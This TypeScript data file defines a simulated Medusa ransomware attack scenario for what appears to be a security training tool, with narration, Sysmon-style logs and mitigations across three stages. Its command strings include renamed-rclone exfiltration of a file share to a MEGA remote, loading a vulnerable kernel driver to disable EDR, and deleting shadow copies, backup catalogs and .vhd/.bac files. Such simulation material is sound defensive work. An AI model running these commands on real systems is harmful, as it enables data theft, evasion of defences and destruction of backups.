import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'medusa-ransomware-gaze-abyss-pdqdeploy',
    title: 'CISA AA25-071A & Palo Alto Unit 42 — Medusa Ransomware: ScreenConnect RMM, gaze.exe (ThrottleStop.sys) Kernel Callback Killer & PDQ Deploy Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI/MS-ISAC Joint Cybersecurity Advisory AA25-071A (#StopRansomware: Medusa Ransomware) and Palo Alto Networks Unit 42 research: Medusa operators establish persistence via ConnectWise ScreenConnect or AnyDesk, deploy `gaze.exe` (which loads signed `ThrottleStop.sys` / `rwdrv.sys` to zero out kernel PsSetCreateProcessNotifyRoutine callbacks), push the `gaze.dll`/`medusa.exe` payload domain-wide via PDQ Deploy or PsExec, and encrypt assets with AES-256-CBC + RSA-2048 (`.medusa`).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Medusa Operator (ScreenConnect / Rclone)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'gaze.exe Kernel Killer (ThrottleStop.sys)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PDQ Deploy / PsExec Distribution Server', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA25-071A / Unit 42 XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Fleet (.medusa AES-256-CBC)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: ScreenConnect RMM Foothold, Advanced IP Scanner & Rclone Exfiltration',
        narration:
          'Following initial exploitation of unpatched perimeter web/VPN services (such as ConnectWise ScreenConnect or Fortinet EMS), Medusa operators install persistent RMM clients (`ScreenConnect.ClientService.exe`), map the internal network using `advanced_ip_scanner.exe`, and exfiltrate sensitive shares using `rclone.exe` disguised as `svchost.exe`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Exfiltration (T1190 / T1219 / T1567.002)',
        technicalCommands: [
          'C:\\Program Files (x86)\\ScreenConnect Client\\ScreenConnect.ClientService.exe',
          'C:\\Windows\\Temp\\svchost.exe copy "\\\\corp-fs01\\hr" mega:medusa_leak --transfers 12 (Renamed rclone.exe)',
        ],
        defenseMitigation:
          'Detect renamed `rclone.exe` binaries via PE `OriginalFileName=rclone.exe` metadata in Sysmon EventID 1 and restrict unauthorized ScreenConnect instance domains.',
        logs: [
          {
            id: 'medusa-1',
            timestamp: '04:08:15.209',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'svchost.exe',
            CommandLine: 'C:\\Windows\\Temp\\svchost.exe copy "\\\\corp-fs01\\hr" mega:medusa_leak --transfers 12',
            raw: 'EventID: 1 | Image: C:\\Windows\\Temp\\svchost.exe | OriginalFileName: rclone.exe | ParentImage: ScreenConnect.WindowsClient.exe | Advisory: CISA AA25-071A (#StopRansomware: Medusa)',
            parsedFields: {
              MasqueradedBinary: 'C:\\Windows\\Temp\\svchost.exe (OriginalFileName: rclone.exe)',
              RmmPersistence: 'ConnectWise ScreenConnect Client',
              AdvisoryId: 'CISA AA25-071A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `gaze.exe` Loading Signed `ThrottleStop.sys` (`rwdrv.sys`) to Blind Kernel Callbacks',
        narration:
          'To neutralize endpoint protection before mass deployment, Medusa drops `gaze.exe` (also known as Abyss Locker / Medusa killer) alongside `ThrottleStop.sys` (renamed `rwdrv.sys`, CVE-2025-7771). `gaze.exe` uses physical memory read/write IOCTLs in `ThrottleStop.sys` to overwrite `PspCreateProcessNotifyRoutine` and `ObRegisterCallbacks` arrays in kernel RAM.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562.001 - Impair Defenses / T1068 - BYOVD)',
        technicalCommands: [
          'sc.exe create rwdrv binPath= "C:\\Windows\\Temp\\rwdrv.sys" type= kernel && sc.exe start rwdrv',
          'C:\\Windows\\Temp\\gaze.exe (Patches kernel PspCreateProcessNotifyRoutine & ObRegisterCallbacks via ThrottleStop.sys IOCTLs)',
        ],
        defenseMitigation:
          'Block `ThrottleStop.sys` (`rwdrv.sys`) hashes via WDAC/HVCI and monitor System EventID 7045 for kernel driver services created from `C:\\Windows\\Temp`.',
        logs: [
          {
            id: 'medusa-2',
            timestamp: '04:12:33.614',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 6,
            ProcessName: 'gaze.exe',
            raw: 'EventID: 6 | ImageLoaded: C:\\Windows\\Temp\\rwdrv.sys (Signed ThrottleStop.sys) | InvokingProcess: C:\\Windows\\Temp\\gaze.exe | Action: ArbitraryPhysicalMemoryRW -> Zeroing EDR Kernel Callbacks',
            parsedFields: {
              EdrKillerTool: 'gaze.exe (Medusa Kernel Callback Wiper)',
              VulnerableDriver: 'rwdrv.sys (ThrottleStop.sys physical memory R/W)',
              TargetedKernelArray: 'nt!PspCreateProcessNotifyRoutine & ObRegisterCallbacks',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: PDQ Deploy Mass Distribution, VSS Deletion & `.medusa` AES-256-CBC Encryption',
        narration:
          'Using PDQ Deploy (`PDQDeployConsole.exe`) or `psexec.exe -s`, the operator pushes the Medusa encryptor (`gaze.exe` / `medusa.exe`) across all domain hosts. Medusa terminates over 280 backup, database, and mail services (`vss`, `sql`, `veeam`, `sophos`), runs `vssadmin Delete Shadows /all /quiet`, deletes `C:\\*.vhd`, and encrypts files with AES-256-CBC + RSA-2048 (`.medusa` and `!!!READ_ME_MEDUSA!!!.txt`).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement & Impact (T1072 - Software Deployment Tools / T1486)',
        technicalCommands: [
          'vssadmin.exe Delete Shadows /all /quiet && wbadmin.exe delete catalog -quiet',
          'wmic.exe process where name="sqlservr.exe" call terminate && del /s /f /q C:\\*.vhd E:\\*.bac',
          'gaze.exe -v "\\\\corp-nas\\shares" (Encrypts with AES-256-CBC -> .medusa & !!!READ_ME_MEDUSA!!!.txt)',
        ],
        defenseMitigation:
          'Require tiered administrative accounts for software deployment consoles (PDQ Deploy, SCCM) and block `del /s /f /q *.vhd` and `wbadmin delete catalog` via EDR.',
        logs: [
          {
            id: 'medusa-3',
            timestamp: '04:17:50.102',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'gaze.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\PDQDeployRunner\\service-1\\exec\\gaze.exe | TargetFilename: C:\\Users\\Public\\!!!READ_ME_MEDUSA!!!.txt | Extension: .medusa | Cipher: AES-256-CBC + RSA-2048',
            parsedFields: {
              DistributionMechanism: 'PDQ Deploy / PsExec Domain Push',
              RansomNote: '!!!READ_ME_MEDUSA!!!.txt',
              EncryptedExtension: '.medusa',
            },
          },
        ],
        packets: [],
      },
    ],
  };
